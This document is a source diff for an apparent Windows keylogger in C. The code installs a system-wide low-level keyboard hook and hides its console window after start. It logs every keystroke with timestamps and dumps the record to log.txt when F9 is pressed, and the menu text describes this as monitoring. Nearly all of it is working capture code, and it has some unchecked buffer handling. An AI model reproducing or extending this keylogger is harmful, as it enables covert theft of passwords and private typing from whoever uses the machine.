@@ -13,11 +13,17 @@
 /* prototypes */
 void renderMenu(); 
 LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+bool isExitKeyPressed(DWORD key);
+void terminateProgram();
+
 /* most people can't write over 1500 characters a minute */
 #define MESSAGE_BUFFER_SIZE 1500
 HHOOK keyboardHook;
 uint_fast16_t messageCount = 1;
 uint_fast16_t keyCount = 0;
+
+HWND window;
+
 
 struct Message {
     char message[MESSAGE_BUFFER_SIZE];
@@ -36,39 +42,64 @@ LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     /* Intercepting the input msg */
     if (wParam == WM_KEYDOWN && nCode == HC_ACTION) {
         
+        if(isExitKeyPressed(lastKeyPressed)) {
+            ShowWindow(window, 1);
+            puts("Writing to file...");
+            MessageBeep(0xFFFFFF);
+            Sleep(1000);
+            terminateProgram();
+        }
+
         static bool updateTime = true;
         fflush(stdout);
 
         if(updateTime) {
             time(&messages[messageCount].messageTime);
             messages[messageCount].timeinfo = localtime(&messages[messageCount].messageTime);
-
-            printf("\n\n<%02d:%02d> = ",
-                   messages[messageCount].timeinfo->tm_hour,
-                   messages[messageCount].timeinfo->tm_min);
             updateTime = false;
         }
 
         messages[messageCount].message[keyCount] = (char)lastKeyPressed;
-        printf("%c", messages[messageCount].message[keyCount]);
-        
-        
+          
         time_t timeOfKey = time(&timeOfKey);
         struct tm* timeOfKeyInfo = localtime(&timeOfKey);
 
         if(timeOfKeyInfo->tm_min != messages[messageCount].timeinfo->tm_min) {
-            puts("THE TIME JUST CHANGED\n");
             messageCount++;
             updateTime = true;
         }
+
         keyCount++;
-        
     }
     return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
 }
 
 void clear() {
     system("cls");
+}
+
+bool isExitKeyPressed(DWORD key) {
+    if(key == VK_F9) { return true; }
+    return false;
+}
+
+void terminateProgram() {
+     /* Write to file */
+        FILE* fp;
+        fp = fopen("log.txt", "w");     
+
+        fprintf(fp, "number of messages: %d\n", messageCount);
+
+        for(size_t i = 1; i <= messageCount; i++) {
+            fprintf(fp, "\n<%02d:%02d> %s",
+                    messages[i].timeinfo->tm_hour,
+                    messages[i].timeinfo->tm_min,
+                    messages[i].message);
+        }
+        
+        fflush(fp);
+        fclose(fp);
+        exit(0);
 }
 
 void handleDirectory() {
@@ -94,49 +125,28 @@ void renderMenu() {
         "a log.txt file summarising the monitoring session.\n\n"
         "Press enter to start capturing...%c", ' ');
     getchar();
-
+    /* Initialising the HHOOK */
+    if (!SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, NULL, 0)) {
+        MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
+    } else {
+        puts("Hook Successful!\n");
+    }
 }
 
 int main(int argc, char* argv[]) {
-    HWND window;
+    
     AllocConsole();
     window = FindWindowA("ConsoleWindowClass", NULL);
 
-    bool showMenu = true;
-
-    while(1) {
-        if(showMenu) { 
-            renderMenu(); 
-            for(size_t i = 0; i < 3; i++) {
-                MessageBeep(0xFFFFFF);
-                Sleep(500);
-            }
-            ShowWindow(window,0);
-            showMenu = false;
-            /* Initialising the HHOOK */
-            if (!SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, NULL, 0)) {
-                MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
-            } else {
-                puts("Hook Successful!\n");
-            }
-        }        
-
-        /* If the terminate key (F9) is pressed. */
-        if (GetAsyncKeyState(VK_F9) & 0x8000) {
-            /* Write to file */
-            // ...
-
-            MessageBeep(0xFFFFFF);
-            ShowWindow(window, 1);
-            puts("\n\n\n\n\n\n\n\nProgram has terminated, please check the log.txt file.\n"
-                 "Press enter to close this terminal...@");
-            getchar();
-            break;
-            /* Clean up */
-            MSG msg;
-            while (GetMessage(&msg, NULL, 0, 0) != 0);
-                UnhookWindowsHookEx(keyboardHook);
-        } 
-    }/* End of main program loop */
+    renderMenu(); 
+    for(size_t i = 0; i < 3; i++) {
+        MessageBeep(0xFFFFFF);
+        Sleep(500);
+    }
+    ShowWindow(window, 0);
+    
+    MSG msg;
+        while (GetMessage(&msg, NULL, 0, 0) != 0);
+            UnhookWindowsHookEx(keyboardHook);
     return EXIT_SUCCESS;
 }
